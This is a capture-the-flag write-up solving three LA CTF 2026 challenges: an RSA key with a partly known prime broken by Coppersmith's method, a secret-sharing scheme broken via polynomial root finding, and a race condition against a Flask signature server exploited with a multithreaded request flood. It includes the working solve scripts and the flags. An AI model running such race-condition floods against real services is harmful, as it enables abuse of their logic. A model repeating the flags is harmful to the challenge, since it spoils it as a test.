# lactf 2026

## six seven again

Source:
```python
#!/usr/local/bin/python3

import secrets
from Crypto.Util.number import getPrime, isPrime, bytes_to_long


def generate_super_67_prime() -> int:
    while True:
        digits = ["6"] * 67
        digits += [secrets.choice("67") for _ in range(67)]
        digits += ["7"] * 67

        test = int("".join(digits))
        if isPrime(test, false_positive_prob=1e-12):
            return test


p = generate_super_67_prime()
q = getPrime(670)
n = p * q
e = 65537

FLAG = open("flag.txt", "rb").read()
m = bytes_to_long(FLAG)

c = pow(m, e, n)

print(f"n={n}")
print(f"c={c}")
```

RSA with 2/3 of $p$'s digits are known.
Can use Coppersmith's.

Solve(sage code)
```python
# got it manualy
n=2946661790043576276212708618859098454257978100643043587945386649019576356942178598973714316886447769183215221176469063467110403908859249432179169901902241857191384719874946987358296421232735872368684442555967594474741212136477548730174894179262959606017263486601858861479408160322231430981007916591182809649419066418315534679359084496712319470608306829521343129261706694948073861601048222092781400033023
c=1948966236729442019398797209001146666470863784436899236849270923742274152010735845233244192321945531907501445236605259488943666162549472814841045584916436046026925772686658240793536668594441318499514187648094394304025159599817572824458132096480482584242855227092311349291644873320967346422377897579620617941458992862127887074051631615148007618679853763018261023121740956556947201600610971223315084481469

# Use Coppersmith's to find unkown digits.
P.<x>=PolynomialRing(Zmod(n))
p0 = int("6"*67 + "0"*67 + "7"*67)
f = p0 + x*(10**67)
f = f.monic()
roots = f.small_roots(X=2**256, beta=1/6)

# Verify the result
assert len(roots) > 0
p = int(p0 + roots[0]*(10**67))
assert n%p == 0
q = n//p

# Calculate RSA
r = (p-1)*(q-1)
e = 65537
d = pow(e,-1,r)
m =int(pow(c,d,n))

print(m.to_bytes(64,byteorder='big',signed=False).decode())

# lactf{n_h4s_1337_b1ts_b3c4us3_667+670=1337}

```

## spreading-secrets


Source:
```python
from Crypto.Util.number import getPrime, bytes_to_long

FLAG = open("flag.txt", "rb").read()
SECRET = bytes_to_long(FLAG)

p = getPrime(512)


class RNG:
    def __init__(self, seed, modulus):
        self.state = seed
        self.a = 4378187236568178488156374902954033554168817612809876836185687985356955098509507459200406211027348332345207938363733672019865513005277165462577884966531159
        self.b = 5998166089683146776473147900393246465728273146407202321254637450343601143170006002385750343013383427197663710513197549189847700541599566914287390375415919
        self.c = 4686793799228153029935979752698557491405526130735717565192889910432631294797555886472384740255952748527852713105925980690986384345817550367242929172758571
        self.d = 4434206240071905077800829033789797199713643458206586525895301388157719638163994101476076768832337473337639479654350629169805328840025579672685071683035027
        self.modulus = modulus

    def next(self):
        self.state = (
            self.a * self.state**3
            + self.b * self.state**2
            + self.c * self.state
            + self.d
        ) % self.modulus
        return self.state


def create_shares(secret, threshold, num_shares, p):
    rng = RNG(secret, p)
    coefficients = [secret]
    for i in range(threshold - 1):
        coefficients.append(rng.next())

    shares = []
    for x in range(1, num_shares + 1):
        y = 0
        for power, coeff in enumerate(coefficients):
            term = (coeff * pow(x, power, p)) % p
            y = (y + term) % p
        shares.append((x, y))

    return shares


THRESHOLD = 10
NUM_SHARES = 15

shares = create_shares(SECRET, THRESHOLD, NUM_SHARES, p)

print(f"p={p}")
# p=12670098302188507742440574100120556372985016944156009521523684257469947870807586552014769435979834701674318132454810503226645543995288281801918123674138911
print(f"Share_1={shares[0]}")
# Share_1=(1, 6435837956013280115905597517488571345655611296436677708042037032302040770233786701092776352064370211838708484430835996068916818951183247574887417224511655)
```

This challenge generate the secret polynomial with a custom PRNG. This PRNG updates its state with a univatiate polynomial. Which makes the final output equals polynomials of the initial state.

For example, the secret polynomial looks like
$f(x)\equiv\sum_{i=0}^{9}\alpha_ix^i\pmod p$.
Let $s$ be the initial state, $g(s) \equiv as^3+bs^2+cs+d\pmod p$. 
$\alpha_i = g^i(s)$
$f(1)$ is published, which equal $\sum_{i=0}^{9}g^i(s)$, is a polynomial of $s$.

So the question is how to solve the polynomial.
This algorithm solves the challenge [Distinct-degree factorization](https://en.wikipedia.org/wiki/Factorization_of_polynomials_over_finite_fields#Distinct-degree_factorization).

Solve(sage code):
```

class RNG2:
    def __init__(self, seed, modulus):
        self.state = seed
        self.a = 4378187236568178488156374902954033554168817612809876836185687985356955098509507459200406211027348332345207938363733672019865513005277165462577884966531159
        self.b = 5998166089683146776473147900393246465728273146407202321254637450343601143170006002385750343013383427197663710513197549189847700541599566914287390375415919
        self.c = 4686793799228153029935979752698557491405526130735717565192889910432631294797555886472384740255952748527852713105925980690986384345817550367242929172758571
        self.d = 4434206240071905077800829033789797199713643458206586525895301388157719638163994101476076768832337473337639479654350629169805328840025579672685071683035027
        self.modulus = modulus

    def next(self):
        self.state = ( 
            self.a * self.state**3
            + self.b * self.state**2
            + self.c * self.state
            + self.d
        )
        return self.state



THRESHOLD = 10
NUM_SHARES = 15

p = 12670098302188507742440574100120556372985016944156009521523684257469947870807586552014769435979834701674318132454810503226645543995288281801918123674138911
y = 6435837956013280115905597517488571345655611296436677708042037032302040770233786701092776352064370211838708484430835996068916818951183247574887417224511655

P.<x>=PolynomialRing(GF(p), implementation='NTL')
rng = RNG2(x,p)

coefficients = [x] 
for i in range(THRESHOLD-1):
    coefficients.append(rng.next())
f = sum(coefficients) - y 

# Distinct-degree factorization
i = 1 
while f.degree(x) >= 2*i:
    f = f.monic()
    q = pow(p,i)
    g = gcd(f, pow(x,q,f) - x)
    f //= g
    g = g.factor()
    solved = False
    for root in g:
        s = p - int(root[0][0])
        flag = s.to_bytes(64,byteorder='big')
        if b'lactf' in flag:
            print(flag)
            exit()
    i += 1

# lactf{d0nt_d3r1v3_th3_wh0l3_p0lyn0m14l_fr0m_th3_s3cr3t_t00!!!}
                                              
```

## misdirection

Source:
```python
import os

# https://github.com/Taumille/NTRUSign
from NTRUSign import KeyGenerator, NTRU
import threading

from flask import Flask, make_response, request, send_from_directory, jsonify
from Crypto.Util.number import long_to_bytes

N_BOUND = 545

app = Flask(__name__, static_url_path="", static_folder="static")

flag = os.environ.get("FLAG", "lactf{fakeflag}")

ready_status = {"status": False}
zero_signature = None


# generate keys and set up some initial data
# this is time-consuming
def setup():
    global NTRUKeys, current_count, zero_signature, signature_cache, ready_status

    current_count = 0

    NTRUKeys = KeyGenerator.KeyPair(gen=True, B=1)

    # Sign the initial count (0) so that client can use it
    (_, r, s) = NTRU.Signing(NTRUKeys, long_to_bytes(current_count), N_BOUND)
    zero_signature = NTRU.export_signature(r, s, N_BOUND, False)

    signature_cache = {zero_signature: 0}

    ready_status["status"] = True


setup_thread = threading.Thread(target=setup)
setup_thread.start()


@app.post("/grow")
def grow():
    global current_count, signature_cache, ready_status, N_BOUND

    if not ready_status["status"]:
        return jsonify({"msg": "Please wait!"})

    request_body = request.get_json()
    client_count = request_body["count"]
    count_sig = request_body["sig"]

    # limit to 4 count
    if current_count < 4 and client_count == current_count:
        if count_sig in signature_cache and signature_cache[count_sig] == client_count:
            verif = True
        else:
            try:
                r, s = NTRU.import_signature(count_sig)
                verif = NTRU.Verifying(
                    long_to_bytes(client_count), r, s, N_BOUND, NTRUKeys
                )
            except Exception:
                verif = False
        if verif:
            current_count += 1

            # sign the new number
            ready_status["status"] = False
            (_, r, s) = NTRU.Signing(NTRUKeys, long_to_bytes(current_count), N_BOUND)
            ready_status["status"] = True
            new_count_sig = NTRU.export_signature(r, s, N_BOUND, False)
            signature_cache[new_count_sig] = current_count
            if current_count >= 4:
                return jsonify(
                    {
                        "msg": f"Snake has grown to length {current_count}. It is too long and does not have any more food.",
                        "count": current_count,
                        "signature": new_count_sig,
                    }
                )
            return jsonify(
                {
                    "msg": f"Snake has grown to length {current_count}",
                    "count": current_count,
                    "signature": new_count_sig,
                }
            )
        else:
            return jsonify(
                {
                    "msg": "Invalid signature!",
                    "count": current_count,
                    "signature": "null",
                }
            )

    return jsonify(
        {
            "msg": "Snake does not have enough food to grow!",
            "count": current_count,
            "signature": "null",
        }
    )


@app.post("/flag")
def get_flag():
    global current_count, ready_status

    if not ready_status["status"]:
        return jsonify({"msg": "Please wait!"})

    # flag costs 14 grows
    # snake must reach full length
    if current_count >= 14:
        current_count -= 14
        return jsonify({"msg": f"Flag: {flag}", "count": current_count})

    return jsonify({"msg": "Snake isn't long enough!", "count": current_count})


# reset the challenge (don't need to restart instance)
@app.get("/regenerate-keys")
def regenerate_keys():
    global ready_status
    ready_status["status"] = False
    setup()
    ready_status["status"] = True
    return jsonify({"msg": "Successfully Reset Challenge"})


@app.get("/zero-signature")
def get_zero_signature():
    global zero_signature

    return jsonify({"signature": zero_signature})


@app.get("/public-key")
def get_public_key():
    global NTRUKeys

    return jsonify({"public-key": NTRUKeys.export_pub()})


@app.get("/current-count")
def get_count():
    global current_count

    return jsonify({"count": current_count})


@app.get("/")
def index():
    resp = make_response(send_from_directory(app.static_folder, "index.html"))
    return resp


@app.get("/status")
def status():
    global ready_status

    return jsonify(ready_status)


if __name__ == "__main__":
    app.run("0.0.0.0", 8000, threaded=True, debug=True)


```

Provide a signed "count" to the server, it will add 1 count and return the signature to you. If you can make the count larger than 13, you get the flag. The problem is that the server stop adding for you after the count is 4.

One important finding is that we are not going to break the signing mechanism, since this doesn't help solve the challenge. 
The procedure of adding(`grow()`) the count is:
![flow](https://hackmd.io/_uploads/r1H_uhCvbl.jpg)

The server never assign client count to server count, and give you flag only when server count is geq 14. So breaking signature will not help.
Then the object is clear, we need to find some flaw in the flow.
Noticing that NTRU signature verification is time consuming. We can make race condition by letting multiple threads "stuck" at verification and finally add the count multiple times.

How to force the server to run verification and pass?
1. The signature must not been stored before.
2. The signature is valid.
The server stores the raw text of the signature provided by client.
And the [tool](https://github.com/Taumille/NTRUSign/blob/master/NTRU.py#L155.) they use will just ignore the first line of the signature.
So by changing first line, we can force the server to verify the signature and pass.


The solution success or not may depend on network condition.
solve(python):

```python
import json
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

BASE_URL = "https://misdirection-j709v.instancer.lac.tf" # remember to change
URL = f"{BASE_URL}/grow"
N_WORKERS = 20
TOTAL_REQUESTS = 20
TIMEOUT = 1
INVALID = 0

# make different payload for different i
def make_payload(i: int) -> dict:
    global signature
    return {
        "count": 3,
        "sig": "-"*1000*(TOTAL_REQUESTS - 1 -i) + str(i) + signature,
    }


session = requests.Session()
session.headers.update({"Content-Type": "application/json"})


barrier = threading.Barrier(N_WORKERS)

# send a post request
def post_once(i: int):
    payload = make_payload(i)

    try:
        barrier.wait(timeout=2)
    except Exception:
        pass

    try:
        r = session.post(URL, data=json.dumps(payload), timeout=TIMEOUT)
        return 0
    except Exception as e:
        return 0


def main():
    global BASE_URL, signature
    url = f"{BASE_URL}/grow"

    # grow to 3 to increase success rate.
    signature = requests.get(f"{BASE_URL}/zero-signature").json()["signature"]
    signature = requests.post(url, json = {"count": 0, "sig":signature}).json()["signature"]   #1
    signature = requests.post(url, json = {"count": 1, "sig":signature}).json()["signature"]   #2
    signature = requests.post(url, json = {"count": 2, "sig":signature}).json()["signature"]   #3

    results = []

    # start flooding
    with ThreadPoolExecutor(max_workers=N_WORKERS) as ex:
        futures = [ex.submit(post_once, i) for i in range(TOTAL_REQUESTS)]
        for fut in as_completed(futures):
            results.append(fut.result())

    # check the result 
    r = requests.post(f"{BASE_URL}/flag")
    while "wait" in r.text:
        r = requests.post(f"{BASE_URL}/flag")
    print(r.text)

    # reset for next try
    requests.get(f"{BASE_URL}/regenerate-keys")


# 10 try
for j in range(10):
    print(f'###{j}###')
    main()


# lactf{d0nt_b3_n0nc00p3r4t1v3_w1th_my_s3rv3r}
```
